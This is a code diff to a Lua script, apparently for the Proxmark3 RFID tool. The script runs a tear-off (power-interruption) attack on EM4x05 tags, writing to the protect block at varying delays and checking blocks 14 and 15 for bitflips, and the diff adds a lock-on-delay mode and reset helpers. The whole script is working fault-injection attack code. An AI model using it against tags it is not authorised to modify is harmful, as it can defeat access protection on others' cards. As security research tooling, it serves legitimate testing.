@@ -6,7 +6,7 @@ author =  [[
 'Author   Iceman
  CoAuthor Doegox
 ]]
-version = 'v0.9.9'
+version = 'v1.0.1'
 desc = [[
 This is scripts loops though a tear attack and reads expected value.
 ]]
@@ -27,6 +27,9 @@ arguments = [[
     -e <delay us>      end delay, must be larger or equal to start delay
     end
 ]]
+
+local set_tearoff_delay = 'hw tearoff -s --on --delay %d'
+local wr_template = 'lf em 4x05_write %s %s %s'
 
 ---
 -- This is only meant to be used when errors occur
@@ -50,6 +53,20 @@ local function help()
     print(example)
 end
 
+local function exit_msg()
+    print('')
+    print('================= '..ansicolors.green..'verify with'..ansicolors.reset..' =================')
+    print('1.  lf em 4x05_write 99 00000000')
+    print('2.  lf em 4x05_dump')
+    print('===============================================')    
+    return nil
+end
+
+local function reset(wr_value, password)
+    print('[=] '..ansicolors.red..'reseting the active lock block'..ansicolors.reset)
+    core.console(wr_template:format(99, wr_value, password))
+end
+
 local function main(args)
 
     --[[
@@ -66,7 +83,7 @@ local function main(args)
     --]]
     local n, password, sd, ed
     
-    for o, a in getopt.getopt(args, 'he:s:a:p:n:r:w:') do
+    for o, a in getopt.getopt(args, 'he:s:p:n:') do
         if o == 'h' then return help() end
         if o == 'n' then n = a end
         if o == 'p' then password = a end
@@ -97,7 +114,7 @@ local function main(args)
         return oops('start delay can\'t be larger than end delay', sd, ed)
     end
 
-    print('==========================================')    
+    print('==========================================')
     print('Starting EM4x05 tear off :: target PROTECT')
 
     if password then
@@ -112,27 +129,25 @@ local function main(args)
     local res_tear = 0
     local res_nowrite = 0
     
-    local set_tearoff_delay = 'hw tearoff --delay %d'
-    local enable_tearoff = 'hw tearoff --on'
-    
-    local wr_template = 'lf em 4x05_write %s %s %s'
-
     -- fix at one specific delay
     if sd == ed then
        n = 0
     end
 
+    local locked_on = false
     local tries = 0
     while sd <= ed do
     
         -- increase loop
         sd = sd + n
         
-        if (tries == 20) and (n == 0) then
-            tries = 0
-            sd = sd + 1
-            ed = ed + 1 
-            print(ansicolors.cyan..'[!] Tried 20 times, increased delay with 1us'..ansicolors.reset)
+        if not locked_on then 
+            if (tries == 10) and (n == 0) then
+                print(ansicolors.cyan..('[!] Tried %d times, increased delay with 1us'):format(tries)..ansicolors.reset)
+                tries = 0
+                sd = sd + 1
+                ed = ed + 1 
+            end
         end
     
         io.flush()
@@ -145,7 +160,6 @@ local function main(args)
 
         local c = set_tearoff_delay:format(sd)
         core.console(c);
-        core.console(enable_tearoff)
 
         c = wr_template:format(99, wr_value, password)
         core.console(c)
@@ -163,27 +177,39 @@ local function main(args)
         end
         
         local wordstr15 = ('%08X'):format(word15)
-
-        if (not (wordstr14 == '00000000' and wordstr15 == wr_value)) and (not (wordstr14 == wr_value and wordstr15 == '00000000')) then
-            print((ansicolors.yellow..'[!] TEAR OFF occurred:'..ansicolors.reset..' 14:%08X 15:%08X'):format(word14, word15))
+        
+        if wordstr14 == rd_value and wordstr15 ~= wr_value then
+            print(('[!] '..ansicolors.cyan..'TEAR OFF'..ansicolors.reset..' occurred: 14: %08X  15: '..ansicolors.cyan..'%08X'..ansicolors.reset):format(word14, word15))
         end
         
         if wordstr14 == rd_value then
             if wordstr15 ~= rd_value and  wordstr15 ~= wr_value then
-                print((ansicolors.red..'[!] tear off result:  '..ansicolors.reset..' 14:%08X 15:%08X'):format(word14, word15))
-                return oops('Success?')
+                print(('[!] '..ansicolors.red..'TEAR OFF bitflip: '..ansicolors.reset..' 14: %08X  15: %08X'):format(word14, word15))
+                
+                
+                local bit15 = bit.band(0x00008000, word15)
+                if bit15 == 0x00008000 then
+                    return exit_msg()
+                else
+                    reset(wr_value, password)
+                    print('[+] locked on to this delay')
+                    locked_on = true
+                end
             end
             
             if wordstr15 == rd_value then
-                print(ansicolors.red..'[!] need to reset'..ansicolors.reset)
-                c = wr_template:format(99, wr_value, password)
-                core.console(c)
-                tries = 0
+                reset(wr_value, password)
+                if not locked_on then  
+                    tries = 0
+                end
             end
         else        
-            print('...')
+            print('...write ok, erase not done', wordstr14, rd_value)
         end
-        tries = tries + 1
+        
+        if not locked_on then 
+            tries = tries + 1
+        end
     end
 end
 
